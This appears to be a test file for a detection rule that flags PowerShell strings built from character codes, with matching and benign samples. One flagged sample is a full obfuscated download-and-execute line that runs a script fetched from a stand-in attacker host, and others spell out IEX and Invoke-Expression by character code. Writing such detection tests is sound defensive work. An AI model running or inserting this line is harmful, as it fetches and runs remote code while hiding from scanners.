# ruleid: ps-charcode-string-assembly
[char]73+[char]69+[char]88

# ruleid: ps-charcode-string-assembly
& ([char]73+[char]69+[char]88) (New-Object Net.WebClient).DownloadString('http://evil.example.com/p.ps1')

# ruleid: ps-charcode-string-assembly
$cmd = [char]73 + [char]110 + [char]118 + [char]111 + [char]107 + [char]101 + [char]45 + [char]69 + [char]120 + [char]112 + [char]114 + [char]101 + [char]115 + [char]115 + [char]105 + [char]111 + [char]110

# ok: ps-charcode-string-assembly
$char = [char]65
Write-Host $char

# ok: ps-charcode-string-assembly
$letter1 = [char]72
$letter2 = [char]105
Write-Host ($letter1 + $letter2)
